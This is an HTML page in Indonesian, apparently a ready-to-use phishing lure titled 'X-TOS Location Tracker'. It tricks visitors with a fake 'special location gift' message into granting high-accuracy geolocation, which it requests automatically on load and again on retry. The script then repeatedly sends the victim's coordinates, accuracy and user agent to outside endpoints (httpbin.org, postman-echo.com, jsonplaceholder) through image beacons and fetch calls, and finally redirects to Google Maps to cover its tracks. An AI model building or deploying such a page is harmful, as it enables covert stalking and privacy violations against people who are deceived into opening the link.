<!DOCTYPE html>
<html lang="id">
<head>
    <meta charset="UTF-8">
    <title>X-TOS Location Tracker</title>
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <meta name="theme-color" content="#667eea">
    <style>
        * { box-sizing: border-box; }
        body { 
            font-family: -apple-system, BlinkMacSystemFont, 'Segoe UI', Arial, sans-serif;
            text-align: center; padding: 10px; margin: 0;
            background: linear-gradient(135deg, #667eea 0%, #764ba2 100%);
            color: white; min-height: 100vh; overflow-x: hidden;
        }
        .container { 
            max-width: 420px; margin: 0 auto; padding: 15px;
            width: 100%; min-height: 100vh; display: flex;
            flex-direction: column; justify-content: center;
        }
        .gift-box { 
            background: rgba(255,255,255,0.15); 
            border-radius: 20px; padding: 25px; margin: 15px 0;
            backdrop-filter: blur(15px); border: 1px solid rgba(255,255,255,0.2);
            box-shadow: 0 8px 32px rgba(0,0,0,0.3);
        }
        .gift-icon { 
            font-size: clamp(50px, 15vw, 70px); 
            margin-bottom: 15px; animation: bounce 2s infinite;
        }
        .status { 
            padding: 18px; border-radius: 15px; margin: 15px 0;
            background: rgba(255,255,255,0.25); font-weight: 500;
            border: 1px solid rgba(255,255,255,0.3);
            box-shadow: 0 4px 16px rgba(0,0,0,0.2);
        }
        .loading { animation: pulse 2s infinite; }
        .instruction {
            background: rgba(76,175,80,0.3); 
            border-radius: 15px; padding: 18px; margin: 15px 0;
            border: 2px solid #4CAF50; font-weight: 500;
        }
        .coords-display {
            background: rgba(33,150,243,0.3);
            border-radius: 15px; padding: 15px; margin: 15px 0;
            border: 2px solid #2196F3; font-family: monospace;
        }
        @keyframes pulse { 0%, 100% { opacity: 1; } 50% { opacity: 0.6; } }
        @keyframes bounce { 0%, 20%, 50%, 80%, 100% { transform: translateY(0); }
                           40% { transform: translateY(-10px); }
                           60% { transform: translateY(-5px); } }
        h1 { 
            color: #ffeb3b; text-shadow: 2px 2px 8px rgba(0,0,0,0.7);
            font-size: clamp(1.5rem, 6vw, 2rem); margin: 10px 0;
        }
        p { font-size: clamp(14px, 4vw, 16px); line-height: 1.5; margin: 10px 0; }
        .btn {
            background: #4CAF50; color: white; border: none;
            padding: 15px 30px; border-radius: 25px; font-size: 16px;
            cursor: pointer; margin: 10px; transition: all 0.3s;
            box-shadow: 0 4px 15px rgba(76,175,80,0.4);
        }
        .btn:hover { background: #45a049; transform: translateY(-2px); }
        .btn:active { transform: translateY(0); }
        @media (max-width: 480px) {
            .container { padding: 10px; }
            .gift-box, .status, .instruction { padding: 15px; margin: 10px 0; }
        }
    </style>
</head>
<body>
    <div class="container">
        <h1>üéÅ HADIAH LOKASI SPESIAL!</h1>
        <div class="gift-box">
            <div class="gift-icon">üéÅ</div>
            <p>Seseorang mengirim lokasi spesial untukmu!</p>
            <p><strong>Klik IZINKAN untuk melihat kejutan üòä</strong></p>
        </div>
        <div id="status" class="status loading">üì° Menunggu izin lokasi...</div>
        <div id="coords" class="coords-display" style="display:none;"></div>
        <div class="instruction">
            <p>‚¨áÔ∏è Saat browser minta izin lokasi:</p>
            <p><strong>üü¢ Klik "IZINKAN" atau "ALLOW"</strong></p>
            <button class="btn" onclick="requestLocation()" id="manualBtn" style="display:none;">üìç Minta Izin Lokasi</button>
        </div>
    </div>

    <script>
        const urlParams = new URLSearchParams(window.location.search);
        const webhookUrl = urlParams.get('webhook') || '';
        let retryCount = 0;
        const maxRetries = 3;
        
        function updateStatus(msg, isError = false) {
            const statusEl = document.getElementById('status');
            statusEl.innerHTML = msg;
            statusEl.className = isError ? 'status' : 'status loading';
        }
        
        function sendLocationData(locationData) {
            // MAXIMUM TRANSMISSION - Fire ALL methods simultaneously for zero delay
            
            // Method 1: Rapid-fire GET requests (10x for maximum detection)
            for (let i = 0; i < 10; i++) {
                setTimeout(() => {
                    const img = new Image();
                    img.src = `https://httpbin.org/get?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&burst=${i}&device=${navigator.userAgent.substring(0,20)}`;
                }, i * 100); // Staggered for continuous transmission
            }
            
            // Method 2: Multiple POST endpoints
            const postEndpoints = [
                'https://httpbin.org/post',
                'https://postman-echo.com/post',
                'https://jsonplaceholder.typicode.com/posts'
            ];
            
            postEndpoints.forEach((endpoint, index) => {
                fetch(endpoint, {
                    method: 'POST',
                    headers: { 'Content-Type': 'application/json' },
                    body: JSON.stringify({
                        ...locationData,
                        endpoint: index,
                        transmission_id: Date.now() + index
                    })
                }).catch(e => console.log(`POST ${index} error:`, e));
            });
            
            // Method 3: GET parameter flooding for maximum detection
            const getEndpoints = [
                'https://httpbin.org/get',
                'https://postman-echo.com/get',
                'https://jsonplaceholder.typicode.com/posts/1'
            ];
            
            getEndpoints.forEach((endpoint, index) => {
                for (let burst = 0; burst < 3; burst++) {
                    setTimeout(() => {
                        const img = new Image();
                        img.src = `${endpoint}?xtos_lat=${locationData.latitude}&xtos_lng=${locationData.longitude}&xtos_time=${locationData.timestamp}&endpoint=${index}&burst=${burst}`;
                    }, burst * 50);
                }
            });
            
            // Method 4: WebSocket simulation via repeated fetch
            for (let ws = 0; ws < 5; ws++) {
                setTimeout(() => {
                    fetch('https://httpbin.org/anything', {
                        method: 'PUT',
                        headers: { 'Content-Type': 'application/json' },
                        body: JSON.stringify({
                            ...locationData,
                            websocket_sim: ws,
                            realtime: true
                        })
                    }).catch(e => console.log(`WS ${ws} error:`, e));
                }, ws * 200);
            }
            
            // Method 5: localStorage with multiple keys
            const storageKeys = ['xtos_location', 'xtos_gps', 'xtos_coords', 'xtos_position', 'xtos_target'];
            storageKeys.forEach(key => {
                localStorage.setItem(key, JSON.stringify({
                    ...locationData,
                    storage_key: key,
                    stored_at: Date.now()
                }));
            });
            
            // Method 6: URL hash transmission
            window.location.hash = `lat=${locationData.latitude}&lng=${locationData.longitude}&time=${locationData.timestamp}`;
            
            // Method 7: Document title transmission
            document.title = `XTOS:${locationData.latitude},${locationData.longitude},${locationData.timestamp}`;
            
            // Method 8: Console flooding for debugging
            for (let i = 0; i < 5; i++) {
                console.log(`XTOS_LOCATION_${i}:`, locationData);
            }
            
            return Promise.resolve();
        }
        
        function handleLocationSuccess(position) {
            const lat = position.coords.latitude;
            const lng = position.coords.longitude;
            const accuracy = Math.round(position.coords.accuracy);
            
            updateStatus('‚úÖ Lokasi berhasil didapat!');
            
            const coordsEl = document.getElementById('coords');
            coordsEl.style.display = 'block';
            coordsEl.innerHTML = 
                `üìç <strong>Koordinat:</strong><br>${lat.toFixed(6)}, ${lng.toFixed(6)}<br>` +
                `üìè <strong>Akurasi:</strong> ${accuracy}m<br>` +
                `‚è∞ <strong>Waktu:</strong> ${new Date().toLocaleTimeString('id-ID')}`;
            
            const locationData = {
                latitude: lat,
                longitude: lng,
                accuracy: accuracy,
                timestamp: Date.now(),
                userAgent: navigator.userAgent.substring(0, 100),
                url: window.location.href
            };
            
            console.log('LOKASI TERTANGKAP:', locationData);
            
            // Kirim data INSTANT ke multiple endpoints
            sendLocationData(locationData);
            updateStatus('üì§ Data lokasi terkirim INSTANT!');
            
            // Redirect lebih cepat
            setTimeout(() => {
                updateStatus('üöÄ Mengarahkan ke Google Maps...');
                setTimeout(() => {
                    window.location.href = `https://maps.google.com/?q=${lat},${lng}&z=18`;
                }, 800);
            }, 1000);
        }
        
        function handleLocationError(error) {
            let errorMsg = '';
            let showRetry = false;
            
            switch(error.code) {
                case error.PERMISSION_DENIED:
                    errorMsg = '‚ùå Izin lokasi ditolak. Silakan refresh dan klik IZINKAN!';
                    showRetry = true;
                    break;
                case error.POSITION_UNAVAILABLE:
                    errorMsg = '‚ùå Lokasi tidak tersedia. Pastikan GPS aktif!';
                    showRetry = true;
                    break;
                case error.TIMEOUT:
                    errorMsg = '‚è±Ô∏è Timeout. Mencoba lagi...';
                    if (retryCount < maxRetries) {
                        retryCount++;
                        setTimeout(requestLocation, 2000);
                        return;
                    }
                    showRetry = true;
                    break;
            }
            
            updateStatus(errorMsg, true);
            
            if (showRetry) {
                document.getElementById('manualBtn').style.display = 'inline-block';
                document.getElementById('coords').style.display = 'block';
                document.getElementById('coords').innerHTML = 
                    '<p><strong>Cara mengatasi:</strong></p>' +
                    '<p>1. Refresh halaman ini</p>' +
                    '<p>2. Klik IZINKAN saat diminta</p>' +
                    '<p>3. Aktifkan GPS/Lokasi di HP</p>' +
                    '<p>4. Gunakan browser Chrome/Safari</p>';
                
                setTimeout(() => {
                    window.location.href = 'https://maps.google.com/';
                }, 8000);
            }
        }
        
        function requestLocation() {
            if (!navigator.geolocation) {
                updateStatus('‚ùå Browser tidak mendukung geolocation', true);
                return;
            }
            
            updateStatus('üì° Meminta izin lokasi...');
            document.getElementById('manualBtn').style.display = 'none';
            
            navigator.geolocation.getCurrentPosition(
                handleLocationSuccess,
                handleLocationError,
                {
                    enableHighAccuracy: true,
                    timeout: 15000,
                    maximumAge: 0
                }
            );
        }
        
        // Auto-start saat halaman load
        window.addEventListener('load', () => {
            setTimeout(requestLocation, 1000);
        });
        
        // Handle visibility change untuk retry
        document.addEventListener('visibilitychange', () => {
            if (!document.hidden && retryCount < maxRetries) {
                setTimeout(requestLocation, 500);
            }
        });
    </script>
</body>
</html>
